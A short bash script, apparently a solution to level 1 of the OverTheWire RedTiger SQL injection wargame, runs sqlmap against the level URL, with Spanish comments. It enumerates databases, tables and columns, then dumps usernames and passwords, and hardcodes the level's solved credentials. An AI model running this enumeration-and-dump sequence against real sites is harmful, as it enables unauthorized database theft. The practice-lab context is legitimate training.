#!bin/bash
original="https://redtiger.labs.overthewire.org/level1.php"
url="https://redtiger.labs.overthewire.org/level1.php?cat=1"
db="hackit"
table="level1_users"
user="Hornoxe"
pass="thatwaseasy"
sqlmap -u $url --dbs --threads 4 #obtenemos el nombre de la base o bases
sqlmap -u $url -D $db --tables --threads 4 #para obtener el nombre de las tablas (opcional)
sqlmap -u $url -D $db -T $table --columns --threads 4 #para obtener el nombre de las columnas 
sqlmap -u $url -D $db -T $table -C id,username,password --dump --threads 4 #obtenemos la info de id,nombre y contrasenna
